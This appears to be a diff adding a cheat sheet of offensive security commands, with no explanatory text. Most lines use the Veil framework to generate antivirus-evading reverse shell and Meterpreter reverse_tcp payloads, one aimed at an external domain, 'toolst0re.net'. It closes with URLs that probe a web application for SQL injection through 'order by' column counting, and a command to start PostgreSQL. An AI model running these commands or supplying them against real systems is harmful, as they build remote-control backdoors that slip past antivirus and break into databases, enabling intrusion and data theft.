@@ -1,0 +1,24 @@
+veil -t Ordnance --list-payloads
+veil -t Ordnance --list-encoders
+veil -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234
+veil -t Ordnance --ordnance-payload rev_http --ip 192.168.1.21 --port 1235 -e xor -b \\x13\\x98
+
+veil -t Evasion --list-payloads
+veil -t Evasion -p 33 --ordnance-payload rev_tcp --ip 192.168.1.3 --port 8675 -o christest
+veil -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris
+veil -t Evasion -p 34 --ordnance-payload rev_tcp --ip 192.168.1.5 --port 8677 -o chrisout -c hostname=thegrid processors=2
+veil --clean
+
+veil -t Ordnance --ordnance-payload rev_tcp --ip https://toolst0re.net --port 4444
+veil -p python/shellcode_inject/aes_encrypt -o output --msfpayload windows/meterpreter/reverse_tcp --msfoptions LHOST=192.168.1.1 LPORT=444
+
+http://10.0.0.12/
+http://10.0.0.12/index.php?page=submit
+http://10.0.0.12/index.php?page=faq
+http://10.0.0.12/index.php?page=login
+http://10.0.0.99/cat.php?id=1 order by 1
+http://10.0.0.99/cat.php?id=1 order by 2
+http://10.0.0.99/cat.php?id=1 order by 3
+http://10.0.0.99/cat.php?id=1 order by 4
+
+sudo systemctl start postgresql.service
